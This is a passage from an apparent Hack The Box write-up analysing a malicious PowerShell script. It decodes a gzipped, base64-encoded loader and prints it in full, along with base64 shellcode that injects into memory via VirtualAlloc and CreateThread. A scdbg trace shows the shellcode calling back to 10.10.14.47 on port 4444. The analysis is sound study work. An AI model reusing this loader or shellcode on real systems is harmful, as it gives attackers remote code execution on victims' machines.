9j+9k/QB/mQEfcWKnzVzC0fxDDNgC7TptD5rPKoljbfDqdRQVTmsFyQKCYNZB9MwpTlijDuy7csODRPnOAfkWOrDsnj55kpTXgS1b+Mg3bq5eQIfZflIaufbJPTFLFd4LhYK0N0Lz6UChPjrgZX5cqcebeXkeABgXmyzg21NFlRme/2/4pXU8Az+uf+C17e9fzj9JQwLORntD5vfb/wWmr8b9iOmAgRt6D+MHKffm9EnxHj1cbC9hpx7ySO/7O7X4uIOvhjOTv8GcKJAY0MKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
    $s.UseShellExecute = $false;
    $s.RedirectStandardOutput = $true;
    $s.WindowStyle = 'Hidden';
    $s.CreateNoWindow = $true;
    $p = [System.Diagnostics.Process]::Start($s);
    

First there’s a check to see if it’s 32- or 64-bit to get the 32-bit
PowerShell, and saves it as `$b`. Then it creates a
`System.Diagnostics.ProcessStartInfo` object, `$s`. It uses this to start
another PowerShell (32-bit this time for sure) with a ScriptBlock defined by
this gzipped and base64-encoded blob.

### Decode

I’ll use
[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64\('A-Za-z0-9%2B/%3D',true\)Gunzip\(\))
to decode it with “From Base64” and “Gunzip” recipes. The result is:

    
    
    function oPJ {
    	Param ($k3l0G, $ldB)		
    	$oNP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    	
    	return $oNP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($oNP.GetMethod('GetModuleHandle')).Invoke($null, @($k3l0G)))), $ldB))
    }
    
    function kBm {
    	Param (
    		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $jYiqn,
    		[Parameter(Position = 1)] [Type] $d6R = [Void]
    	)
    	
    	$br = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    	$br.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $jYiqn).SetImplementationFlags('Runtime, Managed')
    	$br.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $d6R, $jYiqn).SetImplementationFlags('Runtime, Managed')
    	
    	return $br.CreateType()
    }
    
    [Byte[]]$dJFlU = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmgKCg4vaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
    		
    $ti = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((oPJ kernel32.dll VirtualAlloc), (kBm @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dJFlU.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($dJFlU, 0, $ti, $dJFlU.length)
    
    $w8 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((oPJ kernel32.dll CreateThread), (kBm @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$ti,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((oPJ kernel32.dll WaitForSingleObject), (kBm @([IntPtr], [Int32]))).Invoke($w8,0xffffffff) | Out-Null
    

There’s a lot going on there, but I’m immediately drawn to the middle (first
line after the function declarations) where a base64-encoded blog is decoded
into bytes. Just based on the other functions here, that seems like shellcode
to me.

### Shellcode

I’ll decode the shellcode into binary form by echoing the string into `base64
-d` and sending the output to a file:

    
    
    root@kali# echo "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmgKCg4vaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=" | base64 -d > msf-shellcode 
    

Now over in a Windows VM, I’ll use `scdbg`:

    
    
    PS > C:\Tools\scdbg\scdbg.exe -f .\msf-shellcode
    Loaded 16a bytes from file .\msf-shellcode
    Initialization Complete..
    Max Steps: 2000000
    Using base offset: 0x401000
    
    40109d  LoadLibraryA(ws2_32)
    4010ad  WSAStartup(190)
    4010ca  WSASocket(af=2, tp=1, proto=0, group=0, flags=0)
    4010d6  connect(h=42, host: 10.10.14.47 , port: 4444 ) = 71ab4a07
    4010f1  recv(h=42, buf=12fc5c, len=4, fl=0)
    401134  closesocket(h=42)
    4010ca  WSASocket(af=2, tp=1, proto=0, group=0, flags=0)
    4010d6  connect(h=42, host: 10.10.14.47 , port: 4444 ) = 71ab4a07
    
    Stepcount 2000001
    

This is shellcode that is making a socket connection back to 10.10.10.47 port
4444.

[« HTB: Resolute](/2020/05/30/htb-resolute.html)

[](/2020/06/01/resolute-more-beyond-root.html)

